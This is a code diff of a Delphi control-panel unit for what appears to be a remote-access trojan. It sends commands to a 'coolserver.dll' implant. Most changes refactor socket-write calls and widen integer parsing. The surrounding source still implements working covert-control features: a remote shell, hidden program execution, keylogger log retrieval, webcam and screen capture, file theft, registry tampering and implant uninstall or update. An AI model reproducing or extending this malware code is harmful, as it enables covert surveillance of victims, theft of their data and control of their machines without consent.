@@ -3,10 +3,32 @@ unit UnitFormControl;
 interface
 
 uses
-  Windows, Shellapi, Messages, SysUtils, Classes, Graphics, Controls, Forms, CommCtrl,
-  Dialogs, ComCtrls, XPMan, ImgList, Menus, ExtCtrls, StdCtrls, Buttons, {ScktComp,} Jpeg,
+  Windows,
+  Shellapi,
+  Messages,
+  SysUtils,
+  Classes,
+  Graphics,
+  Controls,
+  Forms,
+  CommCtrl,
+  Dialogs,
+  ComCtrls,
+  XPMan,
+  ImgList,
+  Menus,
+  ExtCtrls,
+  StdCtrls,
+  Buttons,
+  {ScktComp,}
+  Jpeg,
   Spin,
-  IdTCPServer, ActiveX, gnugettext, MMsystem, UnitPlugins, md5_unit;
+  IdTCPServer,
+  ActiveX,
+  gnugettext,
+  MMsystem,
+  UnitPlugins,
+  md5_unit;
 
 const
   WM_THUMBS_MESSAGE = WM_USER + 4;  //Mensaje recibido para cargar los thumbs
@@ -557,7 +579,7 @@ begin
     Plugins[NumeroPlugins].subido := false;
     TForm(Plugins[NumeroPlugins].dform).Visible := false;
     //Le decimos al servidor que cargue el plugin si no lo tiene cargado
-    Servidor.Connection.WriteLn('LOADPLUGIN|'+Plugins[NumeroPlugins].PluginName+'|'+inttostr(NumeroPlugins)+'|');
+    ConnectionWriteLn(Servidor, 'LOADPLUGIN|'+Plugins[NumeroPlugins].PluginName+'|'+inttostr(NumeroPlugins)+'|');
     NumeroPlugins := NumeroPlugins+1;
   end;
 end;
@@ -857,7 +879,7 @@ begin
   if Copy(Recibido, 1, 4) = 'PING' then
     begin
       if Servidor.Connection.Connected then
-        Servidor.Connection.Writeln('PONG');
+        ConnectionWriteLn(Servidor, 'PONG');
     end;
 
   if Copy(Recibido, 1, 4) = 'INFO' then
@@ -1058,10 +1080,8 @@ begin
 
       if (Recibido = _('El directorio no existe!')) or (Recibido = _('Unidad no accesible!')) then
         begin
-          EditPathArchivos.Text :=
-            Copy(EditPathArchivos.Text, 1, Length(EditPathArchivos.Text) - 1); //Borra el ultimo '\'
-          EditPathArchivos.Text :=
-            Copy(EditPathArchivos.Text, 1, LastDelimiter('\', EditPathArchivos.Text));
+          EditPathArchivos.Text := Copy(EditPathArchivos.Text, 1, Length(EditPathArchivos.Text) - 1); //Borra el ultimo '\'
+          EditPathArchivos.Text := Copy(EditPathArchivos.Text, 1, LastDelimiter('\', EditPathArchivos.Text));
           BtnActualizarArchivos.Enabled := True;
           ListviewArchivos.Enabled := True;
           if TreeViewarchivos.Visible then
@@ -1106,13 +1126,43 @@ begin
           Delete(Recibido, 1, Pos('|', Recibido));
 
           case StrToInt(Copy(Recibido, 1, (Pos('|', Recibido) - 1))) of //el último caracter
-            0: begin TempStr := TempStr + '-' + _('Unidad desconocida'); if TreeViewarchivos.Visible then Nodo.ImageIndex := 7; end;
-            2: begin TempStr := TempStr + '-' + _('Unidad removible'); if TreeViewarchivos.Visible then Nodo.ImageIndex := 7; end;
-            3: begin TempStr := TempStr + '-' + _('Disco duro'); if TreeViewarchivos.Visible then Nodo.ImageIndex := 8; end;
-            4: begin TempStr := TempStr + '-' + _('Disco de red'); if TreeViewarchivos.Visible then Nodo.ImageIndex := 9; end;
-            5: begin TempStr := TempStr + '-' + _('Unidad de CD/DVD'); if TreeViewarchivos.Visible then Nodo.ImageIndex := 11; end;
-            6: begin TempStr := TempStr + '-' + _('Disc RAM'); if TreeViewarchivos.Visible then Nodo.ImageIndex := 12; end;
+            0: begin 
+				TempStr := TempStr + '-' + _('Unidad desconocida'); 
+				if TreeViewarchivos.Visible then 
+					Nodo.ImageIndex := 7; 
+			   end;
+			   
+            2: begin
+				TempStr := TempStr + '-' + _('Unidad removible');
+				if TreeViewarchivos.Visible then
+					Nodo.ImageIndex := 7;
+			   end;
+			   
+            3: begin
+				TempStr := TempStr + '-' + _('Disco duro');
+				if TreeViewarchivos.Visible then
+					Nodo.ImageIndex := 8;
+			   end;
+			   
+            4: begin
+				TempStr := TempStr + '-' + _('Disco de red');
+				if TreeViewarchivos.Visible then
+					Nodo.ImageIndex := 9;
+			  end;
+			  
+            5: begin
+				TempStr := TempStr + '-' + _('Unidad de CD/DVD');
+				if TreeViewarchivos.Visible then
+					Nodo.ImageIndex := 11;
+			   end;
+			   
+            6: begin
+				TempStr := TempStr + '-' + _('Disc RAM');
+				if TreeViewarchivos.Visible then
+					Nodo.ImageIndex := 12;
+			  end;
           end;
+		  
           if TreeViewarchivos.Visible then 
             Nodo.SelectedIndex := Nodo.ImageIndex;
           cmbUnidades.Items.Add(TempStr);
@@ -1136,11 +1186,22 @@ begin
     begin
       Delete(Recibido, 1, 15); //Borra 'LISTARARCHIVOS|'
       Delete(Recibido, 1, Pos('|', Recibido));
-      if TreeViewarchivos.Visible then
+	  if TreeViewarchivos.Visible then
+      begin
+        //TreeViewArchivos.Items.Clear;
         TreeViewArchivos.Items.BeginUpdate;
+      end;
+
+      //lo marco seleccionado y la mar en coche
       for i := 0 to treeviewArchivos.Items.Count-1 do
+      begin
         if EditPathArchivos.Text = ObtenerRutaAbsolutadearbol(TreeViewArchivos.Items[i]) then
+        begin
           TreeViewArchivos.Selected := TreeViewArchivos.Items[i];
+          break;
+        end;
+      end;
+
 
       ListViewArchivos.Items.BeginUpdate;
       ListViewArchivos.Clear; //Limpia primero...
@@ -1153,7 +1214,9 @@ begin
       Estado(_('Listando directorio: ') + EditPathArchivos.Text);
       while Pos('|', Recibido) > 1 do
         begin
-          if ParaDeListar then break;
+          if ParaDeListar then 
+			break;
+			
           TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
           Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
           if TempStr[1] = #2 then //entonces le llegó una carpeta
@@ -1167,12 +1230,14 @@ begin
               begin
                 if lowercase(ObtenerRutaAbsolutadearbol(TreeviewArchivos.Selected)) = lowercase(EditPathArchivos.text) then
                 begin
+				  //TODO: tengo que evitar que se repitan las carpetas
                   Nodo := TreeViewArchivos.Items.AddChild(TreeViewArchivos.Selected, Copy(TempStr, 1, Pos(':', TempStr) - 1));
                   Nodo.ImageIndex := 3;
                   Nodo.SelectedIndex := 4;
                 end;
                 TreeViewArchivos.Selected.Expand(false);
               end;
+
               Delete(TempStr, 1, Pos(':', Tempstr));
 
               Item.SubItems.Add('');
@@ -1185,7 +1250,7 @@ begin
                 );
               a := a + 1; //numero de carpetas
             end
-          else //entonces es un archivo, saque tambien la información extra...
+          else //entonces es un archivo, debe sacar tambien la información extra...
             begin
               Item := ListViewArchivos.Items.Add;
               Item.ImageIndex := IconNum(TempStr, True);
@@ -1201,30 +1266,38 @@ begin
                 begin
                   Receivingthumbfile := True;
                   if Servidor.Connection.connected then
-                    Servidor.Connection.Writeln('GETFILE|' + EditPathArchivos.Text + tempstr);
+                    ConnectionWriteLn(Servidor, 'GETFILE|' + EditPathArchivos.Text + tempstr);
                 end;
 
+			  //agrega peso
               TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
               Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
-              Item.SubItems.Add(ObtenerMejorUnidad(StrToInt(TempStr)));
+              Item.SubItems.Add(ObtenerMejorUnidad(StrToInt64def(TempStr, 0)));
               RealSize := TempStr;
-              TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
+              
+			  //agrega el tipo
+			  //TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
               Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
-              Item.SubItems.Add({TempStr}'Archivo'); //agrega el tipo
-              TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
+              Item.SubItems.Add({TempStr}'Archivo'); 
+              
+			  //agrega atributos
+			  TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
               Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
               TempStr := StringReplace(TempStr, 'Lectura', _('Lectura'), [rfReplaceAll]);
               TempStr := StringReplace(TempStr, 'Oculto', _('Oculto'), [rfReplaceAll]);
               TempStr := StringReplace(TempStr, 'Lectura', _('Lectura'), [rfReplaceAll]);
-              Item.SubItems.Add(TempStr); //agrega atributos
-              TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
+              Item.SubItems.Add(TempStr); 
+              
+			  //agrega la fecha
+			  TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
               Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
               Item.SubItems.Add(DateToStr(FileDateToDateTime(StrToIntDef(tempstr, 1))) + ' ' +
-                TimeToStr(FileDateToDateTime(StrToIntDef(tempstr, 1)))); //agrega la fecha
+                TimeToStr(FileDateToDateTime(StrToIntDef(tempstr, 1)))); 
               Item.SubItems.Add(RealSize);
             end;
         end;
-      LabelNumeroDeCarpetas.Caption := 'Carpetas: ' + IntToStr(a);
+      
+	  LabelNumeroDeCarpetas.Caption := 'Carpetas: ' + IntToStr(a);
       LabelNumeroDeArchivos.Caption := 'Archivos: ' + IntToStr(listviewarchivos.Items.Count - a - 1);
       Estado(_('Directorio listado!'));
       if PrevisualizacionActiva then
@@ -1434,7 +1507,7 @@ begin
           if (Encontrados > 50000) then Exit; //WTFFF!!!
           SearchItems[encontrados].Nombre := Copy(Recibido, 1, Pos('|', Recibido) - 1);
           Delete(Recibido, 1, Pos('|', Recibido));
-          SearchItems[encontrados].TamanioReal := StrToInt(Copy(Recibido, 1, Pos('|', Recibido) - 1));
+          SearchItems[encontrados].TamanioReal := StrToInt64def(Copy(Recibido, 1, Pos('|', Recibido) - 1), 0);
           SearchItems[encontrados].Tamanio := ObtenerMejorUnidad(StrToInt(Copy(Recibido, 1, Pos('|', Recibido) - 1)));
           Delete(Recibido, 1, Pos('|', Recibido));
           SearchItems[encontrados].Tipo := Copy(Recibido, 1, Pos('|', Recibido) - 1);
@@ -1541,7 +1614,7 @@ begin
           else
             TempStr2 := 'F'; //No guardar
             
-          Servidor.Connection.Write('PLUGINUPLOAD|'+Plugins[i].PluginName+'|'+inttostr(Length(TempStr))+'|'+inttostr(i)+'|'+TempStr2+'|'+#10+TempStr);
+          ConnectionWrite(Servidor, 'PLUGINUPLOAD|'+Plugins[i].PluginName+'|'+inttostr(Length(TempStr))+'|'+inttostr(i)+'|'+TempStr2+'|'+#10+TempStr);
         end;
       end;
     end;
@@ -1597,7 +1670,7 @@ begin
   if not BtnRefrescarInformacion.Enabled then Exit;
   BtnRefrescarInformacion.Enabled := False;
   if Servidor.Connection.Connected then
-    Servidor.Connection.Writeln('INFO')
+    ConnectionWriteLn(Servidor, 'INFO')
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
@@ -1610,7 +1683,7 @@ begin
   BtnRefrescarProcesos.Enabled := False;
   ListviewProcesos.Enabled := False;
   if Servidor.Connection.Connected then
-    Servidor.Connection.Writeln('PROC')
+    ConnectionWriteLn(Servidor, 'PROC')
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
@@ -1630,7 +1703,7 @@ begin
 
           while Assigned(mslistviewitem) do
             begin
-              Servidor.Connection.Writeln('KILLPROC|' + mslistviewitem.SubItems[0]);
+              ConnectionWriteLn(Servidor, 'KILLPROC|' + mslistviewitem.SubItems[0]);
               mslistviewitem := ListViewProcesos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
             end;
 
@@ -1651,9 +1724,9 @@ begin
   if Servidor.Connection.Connected then
     begin
       if (CheckBoxMostrarVentanasOcultas.Checked) then
-        Servidor.Connection.Writeln('WIND|true|')
+        ConnectionWriteLn(Servidor, 'WIND|true|')
       else
-        Servidor.Connection.Writeln('WIND|false|');
+        ConnectionWriteLn(Servidor, 'WIND|false|');
     end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
@@ -1676,10 +1749,10 @@ begin
               if mslistviewitem.Caption = 'Program Manager' then
                 begin
                   if MessageDlg(_('¿Está seguro que desea intentar cerrar la ventana Program Manager? (Es posible que coolserver se bloquee)?'), mtConfirmation, [mbYes, mbNo], 0) = idyes then
-                    Servidor.Connection.Writeln('CLOSEWIN|' + mslistviewitem.SubItems[0]);
+                    ConnectionWriteLn(Servidor, 'CLOSEWIN|' + mslistviewitem.SubItems[0]);
                 end
               else
-                Servidor.Connection.Writeln('CLOSEWIN|' + mslistviewitem.SubItems[0]);
+                ConnectionWriteLn(Servidor, 'CLOSEWIN|' + mslistviewitem.SubItems[0]);
               mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
             end;
         end;
@@ -1703,7 +1776,7 @@ begin
         begin
           while Assigned(mslistviewitem) do
             begin
-              Servidor.Connection.Writeln('MAXWIN|' + mslistviewitem.SubItems[0]);
+              ConnectionWriteLn(Servidor, 'MAXWIN|' + mslistviewitem.SubItems[0]);
               mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
             end;
         end;
@@ -1727,7 +1800,7 @@ begin
         begin
           while Assigned(mslistviewitem) do
             begin
-              Servidor.Connection.Writeln('MINWIN|' + mslistviewitem.SubItems[0]);
+              ConnectionWriteLn(Servidor, 'MINWIN|' + mslistviewitem.SubItems[0]);
               mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
             end;
         end;
@@ -1751,7 +1824,7 @@ begin
         begin
           while Assigned(mslistviewitem) do
             begin
-              Servidor.Connection.Writeln('SHOWWIN|' + mslistviewitem.SubItems[0]);
+              ConnectionWriteLn(Servidor, 'SHOWWIN|' + mslistviewitem.SubItems[0]);
               mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
             end;
         end;
@@ -1775,7 +1848,7 @@ begin
         begin
           while Assigned(mslistviewitem) do
             begin
-              Servidor.Connection.Writeln('HIDEWIN|' + mslistviewitem.SubItems[0]);
+              ConnectionWriteLn(Servidor, 'HIDEWIN|' + mslistviewitem.SubItems[0]);
               mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
             end;
         end;
@@ -1790,7 +1863,7 @@ end;
 procedure TFormControl.Minimizartodas1Click(Sender: TObject);
 begin
   if Servidor.Connection.Connected then
-    Servidor.Connection.Writeln('MINALLWIN')
+    ConnectionWriteLn(Servidor, 'MINALLWIN')
   else
     MessageDlg(Pwidechar(_('No estás conectado!')), mtWarning, [mbOK], 0);
   BtnRefrescarVentanas.Click;
@@ -1810,7 +1883,7 @@ begin
         begin
           while Assigned(mslistviewitem) do
             begin
-              Servidor.Connection.Writeln('BOTONCERRAR|SI|' + mslistviewitem.SubItems[0]);
+              ConnectionWriteLn(Servidor, 'BOTONCERRAR|SI|' + mslistviewitem.SubItems[0]);
               mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
             end;
         end;
@@ -1833,7 +1906,7 @@ begin
         begin
           while Assigned(mslistviewitem) do
             begin
-              Servidor.Connection.Writeln('BOTONCERRAR|NO|' + mslistviewitem.SubItems[0]);
+              ConnectionWriteLn(Servidor, 'BOTONCERRAR|NO|' + mslistviewitem.SubItems[0]);
               mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
             end;
         end;
@@ -1851,7 +1924,7 @@ begin
   EditPathArchivos.Enabled := False;
   cmbUnidades.Enabled := False;
   if Servidor.Connection.Connected then
-    Servidor.Connection.Writeln('VERUNIDADES')
+    ConnectionWriteLn(Servidor, 'VERUNIDADES')
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
@@ -1860,7 +1933,7 @@ procedure TFormControl.cmbUnidadesSelect(Sender: TObject);
 begin
   if Servidor.Connection.Connected then
     begin
-      Servidor.Connection.Writeln('LISTARARCHIVOS|' + Copy(cmbUnidades.Text, 1, 3));
+      ConnectionWriteLn(Servidor, 'LISTARARCHIVOS|' + Copy(cmbUnidades.Text, 1, 3));
       //Manda 'LISTARARCHIVOS|C:\'
       if cmbUnidades.Text <> '' then
         EditPathArchivos.Text := Copy(cmbUnidades.Text, 1, 3);
@@ -1994,7 +2067,7 @@ begin
           else
             FilePath := mslistviewitem.subitems[0];
 
-          Servidor.Connection.Writeln('EXEC|NORMAL|' + FilePath);
+          ConnectionWriteLn(Servidor, 'EXEC|NORMAL|' + FilePath);
           if PageControlArchivos.ActivePage = TabSheetVerArchivos then
             mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected])
           else
@@ -2022,7 +2095,7 @@ begin
             FilePath := EditPathArchivos.Text + mslistviewitem.Caption
           else
             FilePath := mslistviewitem.subitems[0];
-          Servidor.Connection.Writeln('EXEC|OCULTO|' + FilePath);
+          ConnectionWriteLn(Servidor, 'EXEC|OCULTO|' + FilePath);
 
           if PageControlArchivos.ActivePage = TabSheetVerArchivos then
             mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected])
@@ -2055,9 +2128,9 @@ begin
           else
             FilePath := mslistviewitem.subitems[0];
           if mslistviewitem.ImageIndex = 3 then
-            Servidor.Connection.Writeln('DELFOLDER|' + FilePath)
+            ConnectionWriteLn(Servidor, 'DELFOLDER|' + FilePath)
           else
-            Servidor.Connection.Writeln('DELFILE|' + FilePath);
+            ConnectionWriteLn(Servidor, 'DELFILE|' + FilePath);
           if PageControlArchivos.ActivePage = TabSheetVerArchivos then
             mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected])
           else
@@ -2123,7 +2196,7 @@ begin
           S := Item.Caption; //Así evitamos que se cambie el nombre en el ListView
         end
       else
-        Servidor.Connection.Writeln('RENAME|' + EditPathArchivos.Text +
+        ConnectionWriteLn(Servidor, 'RENAME|' + EditPathArchivos.Text +
           ListViewArchivos.Selected.Caption + '|' + EditPathArchivos.Text + S);
     end
   else
@@ -2142,7 +2215,7 @@ begin
         begin
           if DirName[Length(DirName)] <> '\' then
             DirName := DirName + '\';
-          Servidor.Connection.Writeln('MKDIR|' + EditPathArchivos.Text + DirName);
+          ConnectionWriteLn(Servidor, 'MKDIR|' + EditPathArchivos.Text + DirName);
         end;
       btnactualizararchivos.Click;
     end
@@ -2173,7 +2246,7 @@ begin
   SpeedbuttonRutasRapidas.Enabled := False;
   if EditPathArchivos.Text[Length(EditPathArchivos.Text)] <> '\' then
     EditPathArchivos.Text := EditPathArchivos.Text + '\';
-  Servidor.Connection.Writeln('LISTARARCHIVOS|' + EditPathArchivos.Text);
+  ConnectionWriteLn(Servidor, 'LISTARARCHIVOS|' + EditPathArchivos.Text);
 end;
 
 //Obtiene la ruta completa del arbol padre\hijo\nieto\ xD
@@ -2201,7 +2274,7 @@ begin
   if TreeViewRegedit.Selected <> nil then
     begin
       EditPathRegistro.Text := ObtenerRutaAbsolutaDeArbol(TreeViewRegedit.Selected);
-      Servidor.Connection.Writeln('LISTARVALORES|' + EditPathRegistro.Text);
+      ConnectionWriteLn(Servidor, 'LISTARVALORES|' + EditPathRegistro.Text);
       
       ListViewRegistro.Enabled := False;
       BtnVerRegisto.Enabled := False;
@@ -2216,7 +2289,7 @@ begin
       Exit;
     end;
   TreeViewRegedit.Enabled := False;
-  Servidor.Connection.Writeln('LISTARCLAVES|' + EditPathRegistro.Text);
+  ConnectionWriteLn(Servidor, 'LISTARCLAVES|' + EditPathRegistro.Text);
 end;
 
 //Lo hacemos en una función a parte para no saturar de código la función OnRead
@@ -2314,7 +2387,7 @@ begin
     begin
       ListViewRegistro.Enabled := False;
       BtnVerRegisto.Enabled := False;
-      Servidor.Connection.Writeln('LISTARVALORES|' + EditPathRegistro.Text);
+      ConnectionWriteLn(Servidor, 'LISTARVALORES|' + EditPathRegistro.Text);
     end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
@@ -2347,7 +2420,7 @@ begin
       Exit;
     end;
 
-  Servidor.Connection.Writeln('NEWNOMBREVALOR|' + EditPathRegistro.Text +
+  ConnectionWriteLn(Servidor, 'NEWNOMBREVALOR|' + EditPathRegistro.Text +
     '|' + Item.Caption + '|' + S);
 end;
 
@@ -2359,12 +2432,12 @@ begin
         begin
           if MessageDlg(_('¿Está seguro de que quiere borrar el valor ') +
             ListViewRegistro.Selected.Caption + '?', mtConfirmation, [mbYes, mbNo], 0) <> idNo then
-            Servidor.Connection.Writeln('BORRARREGISTRO|' + EditPathRegistro.Text +
+            ConnectionWriteLn(Servidor, 'BORRARREGISTRO|' + EditPathRegistro.Text +
               ListViewRegistro.Selected.Caption);
         end
       else if MessageDlg(_('¿Está seguro de que quiere borrar la clave ') +
         TreeViewRegedit.Selected.Text + '?', mtConfirmation, [mbYes, mbNo], 0) <> idNo then
-        Servidor.Connection.Writeln('BORRARREGISTRO|' + EditPathRegistro.Text);
+        ConnectionWriteLn(Servidor, 'BORRARREGISTRO|' + EditPathRegistro.Text);
     end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
@@ -2473,7 +2546,7 @@ begin
       NewClave := InputBox(_('Escriba el nombre para la nueva clave.'),
         _('Crear nueva clave'), _('NuevaClave'));
       if NewClave <> '' then
-        Servidor.Connection.Writeln('NEWCLAVE|' + EditPathRegistro.Text + '|' + NewClave);
+        ConnectionWriteLn(Servidor, 'NEWCLAVE|' + EditPathRegistro.Text + '|' + NewClave);
     end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
@@ -2497,9 +2570,9 @@ begin
   if TimerCaptureScreen.Enabled then
     TimerCaptureScreen.Enabled := not TimerCaptureScreen.Enabled; //Desactivamos el timer, será activado cuando recibamos la captura
   if FormVisorCaptura = nil then
-    Servidor.Connection.Writeln('CAPSCREEN|' + IntToStr(TrackBarCalidad.Position) + '|' + IntToStr(imgCaptura.Height) + '|')
+    ConnectionWriteLn(Servidor, 'CAPSCREEN|' + IntToStr(TrackBarCalidad.Position) + '|' + IntToStr(imgCaptura.Height) + '|')
   else
-    Servidor.Connection.Writeln('CAPSCREEN|' + IntToStr(TrackBarCalidad.Position) + '|' + IntToStr((FormVisorCaptura as TScreenMax).imgcaptura.Height) + '|');
+    ConnectionWriteLn(Servidor, 'CAPSCREEN|' + IntToStr(TrackBarCalidad.Position) + '|' + IntToStr((FormVisorCaptura as TScreenMax).imgcaptura.Height) + '|');
 end;
 
 procedure TFormControl.Enviarteclas1Click(Sender: TObject);
@@ -2540,7 +2613,7 @@ begin
       Exit;
     end;
 
-  Servidor.Connection.Writeln('LISTARWEBCAMS');
+  ConnectionWriteLn(Servidor, 'LISTARWEBCAMS');
 end;
 
 procedure TFormControl.BtnCapturarWebcamClick(Sender: TObject);
@@ -2557,7 +2630,7 @@ begin
   BtnCapturarWebcam.Enabled := False;
   if TimerCamCapture.Enabled then
     TimerCamCapture.Enabled := not TimerCamCapture.Enabled; //Desactivamos el timer, será activado cuando recibamos la captura
-  Servidor.Connection.Writeln('CAPTURAWEBCAM|' + IntToStr(ComboboxWebcam.ItemIndex) +
+  ConnectionWriteLn(Servidor, 'CAPTURAWEBCAM|' + IntToStr(ComboboxWebcam.ItemIndex) +
     '|' + IntToStr(TrackBarCalidadWebcam.Position));
 end;
 
@@ -2587,12 +2660,12 @@ begin
       if button = mbLeft then
         begin
           //Hacer Click
-          Servidor.Connection.Writeln('MOUSEP' + IntToStr(X) + '|' + IntToStr(y) + '|' + 'CLICKIZQ' + '|');
+          ConnectionWriteLn(Servidor, 'MOUSEP' + IntToStr(X) + '|' + IntToStr(y) + '|' + 'CLICKIZQ' + '|');
         end
       else if button = mbRight then
         begin
           //Hacer Click
-          Servidor.Connection.Writeln('MOUSEP' + IntToStr(X) + '|' + IntToStr(y) + '|' + 'CLICKDER' + '|');
+          ConnectionWriteLn(Servidor, 'MOUSEP' + IntToStr(X) + '|' + IntToStr(y) + '|' + 'CLICKDER' + '|');
         end;
     end;
 end;
@@ -2602,7 +2675,7 @@ begin
   if not BtnActualizarServidorInfo.Enabled then Exit;
   BtnActualizarServidorInfo.Enabled := False;
   if Servidor.connection.Connected then
-    Servidor.connection.writeln('SERVIDOR|INFO|')
+    ConnectionWriteLn(Servidor, 'SERVIDOR|INFO|')
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
@@ -2621,21 +2694,21 @@ begin
       if MessageBoxW(Handle,
         Pwidechar(_('¿Está seguro de que desea cerrar el servidor? Este no se volverá a iniciar si no están activos los métodos de auto-inicio.')),
         pwidechar(_('Confirmación')), Mb_YesNo + MB_IconAsterisk) = idYes then
-        Servidor.Connection.Writeln('SERVIDOR|CERRAR|');
+        ConnectionWriteLn(Servidor, 'SERVIDOR|CERRAR|');
     end;
   if ComboBoxGestionDeServidor.Text = _('Desinstalar') then
     begin
       if MessageBoxW(Handle,
         Pwidechar(_('¿Está seguro de que desea desinstalar el servidor? ¡Este será removido completamente del equipo!')),
         Pwidechar(_('Confirmación')), Mb_YesNo + MB_IconAsterisk) = idYes then
-        Servidor.Connection.Writeln('SERVIDOR|DESINSTALAR|');
+        ConnectionWriteLn(Servidor, 'SERVIDOR|DESINSTALAR|');
     end;
   if ComboBoxGestionDeServidor.Text = _('Actualizar') then
     begin
       if MessageBoxW(Handle,
         Pwidechar(_('¿Está seguro de que desea actualizar los servidores seleccionados? ¡Se volverá a enviar coolserver.dll!')),
         Pwidechar(_('Confirmación')), Mb_YesNo + MB_IconAsterisk) = idYes then
-        Servidor.Connection.Writeln('SERVIDOR|ACTUALIZAR|');
+        ConnectionWriteLn(Servidor, 'SERVIDOR|ACTUALIZAR|');
     end;
 end;
 
@@ -2682,7 +2755,7 @@ begin
       if (mslistviewitem.ImageIndex = 3) then
         begin
           PageControlArchivos.ActivePage := TabSheetTransferencias;
-          Servidor.Connection.Writeln('GETFOLDER|' + FilePath + '\');
+          ConnectionWriteLn(Servidor, 'GETFOLDER|' + FilePath + '\');
         end
       else
         agregardescarga(FilePath);
@@ -2730,7 +2803,7 @@ begin
               Exit;
             end;
         end;
-      Servidor.Connection.Writeln('SENDFILE|' + OpenDialogUpload.FileName +
+      ConnectionWriteLn(Servidor, 'SENDFILE|' + OpenDialogUpload.FileName +
         '|' + EditPathArchivos.Text + ExtractFileName(OpenDialogUpload.FileName) +
         '|' + Clave(OpenDialogUpload.FileName) +
         '|' + IntToStr(MyGetFileSize(OpenDialogUpload.FileName)));
@@ -2751,14 +2824,14 @@ var
   p: Pointer;
   Bufferr: array[0..4095 {4kb}] of Byte;
 begin
-  Buffer := Trim(Athread.Connection.ReadLn(#10#15#80#66#77#1#72#87));
+  Buffer := Trim(ConnectionReadLn(Athread, #10#15#80#66#77#1#72#87));
 
   if Copy(PChar(Buffer), 1, 7) = 'GETFILE' then
     begin
       Delete(Buffer, 1, Pos('|', Buffer));
       FilePath := Copy(Buffer, 1, Pos('|', Buffer) - 1);
       Delete(Buffer, 1, Pos('|', Buffer));
-      Size := StrToInt(Trim(Buffer));
+      Size := StrToInt64(Buffer);
       CrearDirectoriosUsuario();
       Descarga := TDescargaHandler.Create(Athread, FilePath, Size,
         DirDescargas + ExtractFileName(FilePath), ListViewDescargas, True);
@@ -2770,7 +2843,7 @@ begin
       Delete(Buffer, 1, Pos('|', Buffer));
       FilePath := Copy(Buffer, 1, Pos('|', Buffer) - 1);
       Delete(Buffer, 1, Pos('|', Buffer));
-      Size := StrToInt(Buffer);
+      Size := StrToInt64(Buffer);
       for i := 0 to ListViewDescargas.Items.Count - 1 do
         begin
           Descarga := TDescargaHandler(ListViewDescargas.Items[i].Data);
@@ -2957,7 +3030,7 @@ begin
   else if Copy(PChar(Buffer), 1, 17) = 'KEYLOGGERLOGSTART' then
     begin
       Delete(Buffer, 1, Pos('|', Buffer));
-      CapSize[4] := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1)); //Tamaño del Log
+      CapSize[4] := StrToInt64(Copy(Buffer, 1, Pos('|', Buffer) - 1)); //Tamaño del Log
       ProgressBarKeylogger.Position := 0;
       MSC[4] := TMemoryStream.Create;
       MSC[4].Position := 0;
@@ -3097,7 +3170,7 @@ begin
             if not Descarga.Transfering and not Descarga.cancelado and not
               Descarga.Finalizado and Descarga.es_descarga then //en espera
             begin
-              Servidor.Connection.Writeln('RESUMETRANSFER|' + Descarga.Origen +
+              ConnectionWriteLn(Servidor, 'RESUMETRANSFER|' + Descarga.Origen +
                 '|' + IntToStr(Descarga.Descargado));
               Exit;
             end;
@@ -3221,7 +3294,7 @@ procedure TFormControl.Activar2Click(Sender: TObject);
 begin
   MemoShell.Lines.Clear;
   if Servidor.Connection.Connected then
-    Servidor.Connection.Writeln('SHELL|ACTIVAR')
+    ConnectionWriteLn(Servidor, 'SHELL|ACTIVAR')
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
@@ -3239,7 +3312,7 @@ begin
       if Lowercase(ComboBoxShellCommand.Text) = 'cls' then
         MemoShell.Text := '';
 
-      Servidor.Connection.Writeln('SHELL|' + ComboBoxShellCommand.Text);
+      ConnectionWriteLn(Servidor, 'SHELL|' + ComboBoxShellCommand.Text);
 
       //Agrega el comando que acabo de escribir a la lista de comandos del combobox
       if ComboBoxShellCommand.Items.Count > 0 then //inserta un item de primero en la lista
@@ -3290,7 +3363,7 @@ procedure TFormControl.Desactivar2Click(Sender: TObject);
 begin
   ComboBoxShellCommand.Enabled := False;
   if Servidor.Connection.Connected then
-    Servidor.Connection.Writeln('SHELL|DESACTIVAR')
+    ConnectionWriteLn(Servidor, 'SHELL|DESACTIVAR')
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
@@ -3319,7 +3392,7 @@ begin
       Exit;
     end;
   ListViewServicios.Clear;
-  Servidor.Connection.Writeln('LISTARSERVICIOS');
